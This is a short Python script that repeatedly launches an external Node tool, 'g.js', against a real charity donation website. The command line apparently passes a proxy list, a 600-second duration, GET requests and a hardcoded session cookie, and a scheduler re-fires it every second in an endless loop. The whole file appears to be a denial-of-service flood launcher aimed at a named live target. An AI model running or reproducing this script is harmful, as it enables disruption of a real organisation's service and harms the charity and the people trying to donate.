import schedule
import time
import os
import sys

os.system('node g.js https://donate.pacquiaofoundation.org http.txt 600 GET PHPSESSID:ohq0tcrvhgfuo6ljh8mn20ndu7')

def job():
    os.system('node g.js https://donate.pacquiaofoundation.org http.txt 600 GET PHPSESSID:ohq0tcrvhgfuo6ljh8mn20ndu7')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)